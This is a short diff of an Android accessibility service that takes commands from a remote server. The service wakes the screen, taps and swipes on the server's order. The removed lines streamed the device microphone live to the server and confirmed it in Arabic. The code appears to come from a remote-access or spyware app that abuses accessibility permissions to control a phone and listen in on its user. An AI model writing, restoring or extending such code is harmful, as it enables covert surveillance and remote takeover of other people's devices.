@@ -266,16 +266,7 @@ public class AlmavivaAccessibilityService extends AccessibilityService {
                                     wakeScreenIfNeeded();
                                     dispatchTouchClickPercent((float) xp, (float) yp);
                                 }
-                            } else if ("START_AUDIO_STREAM".equals(action)) {
-                                Log.i(TAG, "Server requested start audio streaming 🎙️");
-                                AudioStreamHelper.startStreaming(cleanUrl, email, httpClient);
-                                sendAck(cleanUrl, email, "AUDIO", true, "تم تفعيل الميكروفون وبث الصوت المباشر 🎙️");
-                            } else if ("STOP_AUDIO_STREAM".equals(action)) {
-                                Log.i(TAG, "Server requested stop audio streaming");
-                                AudioStreamHelper.stopStreaming();
-                                sendAck(cleanUrl, email, "AUDIO", true, "تم إيقاف بث الصوت");
-                            } else if ("AUDIO_PING".equals(action)) {
-                                AudioStreamHelper.pingAudioStream();
+
                             } else if ("SWIPE".equals(action)) {
                                 double sx = json.optDouble("startX", 0.5);
                                 double sy = json.optDouble("startY", 0.7);
